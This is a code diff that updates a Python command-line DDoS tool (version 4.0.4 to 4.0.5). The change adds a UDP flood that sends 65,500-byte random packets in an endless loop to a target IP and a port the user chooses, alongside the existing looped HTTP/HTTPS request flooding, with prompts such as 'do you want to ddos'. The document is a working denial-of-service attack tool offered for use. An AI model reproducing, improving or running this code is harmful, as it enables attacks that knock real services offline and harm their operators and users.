@@ -1,5 +1,5 @@
 #creator: Fxrt2711
-#version: 4.0.4
+#version: 4.0.5
 #date: 25/1/24
 #update: 28/1/24
 #
@@ -31,6 +31,14 @@ try:
     from time import sleep
 except:
     exit("missing lib: time !! \n install it with: pip install time")
+try:
+    import socket
+except:
+    exit("missing lib: socket !! \n install it with: pip install socket")
+try:
+    import random
+except:
+    exit("missing lib: socket !! \n install it with: pip install socket")
 #
 op_sy = sys.platform
 #
@@ -42,15 +50,22 @@ def clear():
         os.system("cls")
 #
 #
-def dos_trget(target,st):
+def dos_trget(target,st,portp):
 #
-#    print(st)
+    bytes_num = 0
+    if st == ("ip"):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#
     while True:
+        bytes_num = bytes_num + 1
         try:
             if st == ("ip"):
                 try:
-                    ives = ping(target)
-                    print(f"ping sented to {target} delay: {ives}")
+#
+                    bytes = random._urandom(65500)
+                    sock.sendto(bytes,(target, portp))
+                    print(Fore.GREEN + f"{bytes_num} sended to {target}")
+#
                 except:
                     try:
                         print(f"waiting for {target} to accept")
@@ -65,7 +80,7 @@ def dos_trget(target,st):
                 rves = requests.get(target)
                 rxes = requests.get(target)
                 try:
-                    print(f"Request sented to {target}")
+                    print(f"Requests: {bytes_num} sented to {target}")
                 except:
                     exit()
 #
@@ -95,10 +110,13 @@ while True:
     run_http_url = True
     run_https_url = True
     run_ip = True
+    run_port = True
+    run_threads = True
     run_target_selsection = True
 #
     while run_target_selsection:
-#
+#       
+        print ("")
         print (Fore.GREEN + "do you want to ddos (ip)(https)(http)")
         un_selection_input = input("~> ")
         selection_input = un_selection_input.replace(' ','')
@@ -106,15 +124,15 @@ while True:
         if selection_input == ("http"):
             while run_http_url:
 #
-                unh_target_url_ip = input(Fore.GREEN + "Enter URL>> ")
+                unh_target_url_ip = input(Fore.GREEN + "Enter URL~> ")
                 target_url_ip = unh_target_url_ip.replace(' ','')
 #
                 if target_url_ip.startswith("https"):
-                    print("wrong url. you can,t ddos https")
+                    print(Fore.RED + "wrong url. you can,t ddos https")
                     pass
 #
                 elif not target_url_ip.__contains__("."):
-                    print("invalid domain")
+                    print(Fore.RED + "invalid domain")
                     pass
 #
                 else:
@@ -124,15 +142,15 @@ while True:
         elif selection_input == ("https"):
             while run_https_url:
 #
-                unhp_target_url_ip = input(Fore.GREEN + "Enter URL>> ")
+                unhp_target_url_ip = input(Fore.GREEN + "Enter URL~> ")
                 target_url_ip = unhp_target_url_ip.replace(' ','')
-#
+#               
                 if not target_url_ip.startswith("https"):
-                    print("wrong url. you can,t ddos http")
+                    print(Fore.RED + "wrong url. you can,t ddos http")
                     pass
 #
                 elif not target_url_ip.__contains__("."):
-                    print("invalid domain")
+                    print(Fore.RED + "invalid domain")
                     pass
 #
                 else:
@@ -142,39 +160,63 @@ while True:
         elif selection_input == ("ip"):
             while run_ip:
 #
-                unip_target_url_ip = input(Fore.GREEN + "Enter IP>> ")
+                unip_target_url_ip = input(Fore.GREEN + "Enter IP~> ")
+#               
                 target_url_ip = unip_target_url_ip.replace(' ','')
 #
                 if not target_url_ip.__contains__("."):
-                    print("invalid ip")
+                    print(Fore.RED + "invalid ip")
                     pass
 #
                 else:
                     run_ip = False
+#
+            while run_port:
+                print(Fore.GREEN + "\ndefult port: 80 \ndo you want to use port 80 ? \n[Y/n]")
+                port_u_s = input("~> ")
+#
+                if port_u_s == ("Y"):
+                    port = 80
+                elif port_u_s == ("y"):
+                    port = 80
+                elif port_u_s == (""):
+                    port = 80
+                else:
+                    unipp_port = input(Fore.GREEN + 'Enter Port~> ')
+                    port = unipp_port.replace(' ','')
+#
+                if len(str(port)) > 4:
+                    print(Fore.RED + "invalid port")
+                    pass
+                else:
+                    run_port = False
                     run_target_selsection = False
 #
         else:
             pass
 #
 #
-    run_threads = True
     while run_threads:
-        try:
+        if selection_input == ("ip"):
+            run_threads = False
+        else:
 #
-            threads = int(input(Fore.GREEN + "Threads: " + Fore.RED + ""))
+            try:
+#               
+                threads = int(input(Fore.GREEN + "Threads: " + Fore.RED + ""))
 #
-            if threads <= 0:
+                if threads <= 0:
+                    print("invalid number")
+                    pass
+                elif threads == ():
+                    print("invalid number")
+                    pass
+                else:
+                    run_threads = False
+#
+            except:
                 print("invalid number")
                 pass
-            elif threads == ():
-                print("invalid number")
-                pass
-            else:
-                run_threads = False
-#
-        except:
-            print("invalid number")
-            pass
 # 
 #
     print("press enter to start the attack")
@@ -231,4 +273,4 @@ while True:
             except:
                 exit()
     else:
-        dos_trget(target_url_ip,"ip")
+        dos_trget(target_url_ip,"ip",port)
